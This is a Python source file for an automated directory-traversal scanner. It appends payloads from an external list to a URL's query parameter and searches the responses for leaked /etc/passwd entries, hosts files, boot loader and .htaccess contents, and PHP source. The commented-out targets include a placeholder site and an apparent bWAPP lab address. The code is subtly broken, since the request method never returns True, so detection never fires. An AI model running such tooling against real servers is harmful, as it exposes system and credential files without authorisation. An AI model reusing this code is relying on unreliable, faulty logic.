from general import *
import re
import requests
from http.cookies import SimpleCookie

class trav_attack:

    def __init__(self, url):
        self.url = url
        self.log = list()
        self.match = ("boot\W*loader",
                      "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]+[a-zA-Z0-9-_.]*",
                      "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t][a-zA-Z0-9-_.]*",
                      "\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]+:[\/a-zA-Z0-9]*",
                      "AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile",
                      "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
                      "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV")

        self.boot()

    def boot(self):
        found = 0
        catchdata = ""
        part = re.split("([^\?]+)(\?.*=)", self.url)
        list_attack = file_to_set("db_travelsal.txt")
        for list in list_attack:
            print(part[1] + part[2] + list)
            fullLink = part[1] + part[2] + list
            req = request()
            if req.query(fullLink):
                for find in self.match:
                    #print("find")
                    catchdata = re.findall(str(find), req.raw)
                    if (len(catchdata) != 0):
                        found += len(catchdata)
                        #print(" Contents Found: " + str(len(catchdata)))
                        break
            if found > 0:
                break

        if found > 0:
            self.log.append(self.url)
            self.log.append("~Contents Found: " + str(found))
            for i in catchdata:
                self.log.append("~" + str(i))

    def return_output(self):
        output = self.log
        return output

class request(object):
    def query(self, url, cookie=None):
        if cookie:
            rawdata = "Cookie: " + cookie
            cookie = SimpleCookie()
            cookie.load(rawdata)

        try:
            req = requests.get(url, cookies=cookie, allow_redirects=False, timeout=2)
            self.raw = req.text
            self.code = req.status_code
        except:
            return False

#trav_attack("http://testsite.com/get.php?f=list$g=coba")
#trav_attack("http://192.168.58.101/bWAPP/directory_traversal_1.php?page=a.txt")
